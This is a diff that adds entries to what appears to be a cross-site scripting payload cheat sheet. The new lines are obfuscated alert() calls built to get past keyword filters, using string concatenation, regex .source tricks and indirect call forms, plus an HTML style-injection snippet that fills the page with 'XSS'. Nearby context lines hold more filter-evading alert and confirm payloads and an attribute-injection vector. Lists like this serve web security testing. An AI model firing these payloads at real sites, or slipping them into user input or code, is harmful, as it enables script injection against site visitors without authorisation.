@@ -233,6 +233,13 @@ al\u0065rt(1)
 top[‘al\145rt’](1)
 top[‘al\x65rt’](1)
 top[8680439..toString(30)](1)
+globalThis[/al/.source+/ert/.source]`1` 
+[alert][0].call(this,1)
+(1,2,3,4,5,6,7,8,alert)(1)
+top['al\x65rt'](1)
+window['a'+'l'+'e'+'r'+'t'].call(this,1)
+top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
+
 
 confirm()
 confirm``
@@ -492,6 +499,8 @@ window.open ("sms:[00000000000]?body=" + "mensaje","_system");
 
 ```
 1"Style="position:fixed;top:350;left:400;font-size:99999px;"OnPointerEnter="new class extends confirm`_Y000!_`{}"
+
+<b/style=position:fixed;top:0;left:0;font-size:200px>XSS<!--
 
 ```
 
